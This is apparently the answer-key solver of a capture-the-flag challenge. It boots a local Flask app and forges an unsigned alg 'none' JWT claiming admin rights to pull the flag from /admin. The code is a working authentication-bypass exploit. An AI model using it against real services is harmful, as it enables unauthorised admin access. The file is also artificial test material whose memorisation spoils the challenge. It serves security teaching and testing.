#!/usr/bin/env python3
"""
Solver for jwt-none-alg.

Attack: the server's decode_token() trusts the attacker-supplied `alg`
header field. If we hand it a token with header {"alg": "none"} and an
empty signature, it skips verification entirely and just trusts our
payload -- including "admin": true.

This script boots the vulnerable Flask app itself (so verify_all.py can run
it end-to-end with no manual setup), then performs the exact HTTP attack a
player would.
"""
import base64
import json
import os
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def wait_for_server(base_url: str, timeout=10):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(base_url, timeout=1)
            return True
        except requests.exceptions.ConnectionError:
            time.sleep(0.2)
    return False


def forge_none_alg_token(username="guest", admin=True) -> str:
    header = {"alg": "none", "typ": "JWT"}
    payload = {"username": username, "admin": admin}
    header_b64 = b64url_encode(json.dumps(header).encode())
    payload_b64 = b64url_encode(json.dumps(payload).encode())
    # alg=none tokens conventionally have an empty signature segment
    return f"{header_b64}.{payload_b64}."


def solve(base_url="http://127.0.0.1:5000"):
    token = forge_none_alg_token()
    resp = requests.get(
        f"{base_url}/admin",
        headers={"Authorization": f"Bearer {token}"},
        timeout=5,
    )
    resp.raise_for_status()
    data = resp.json()
    if "flag" not in data:
        raise RuntimeError(f"Attack failed, server said: {data}")
    return data["flag"]


def main():
    # Run the app as a subprocess on port 5000 (matches app.py's hardcoded port).
    proc = subprocess.Popen(
        [sys.executable, os.path.join(HERE, "app.py")],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        if not wait_for_server("http://127.0.0.1:5000/"):
            out, err = proc.communicate(timeout=2)
            raise RuntimeError(f"server did not start: {err.decode()}")
        flag = solve()
        print(flag)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    main()
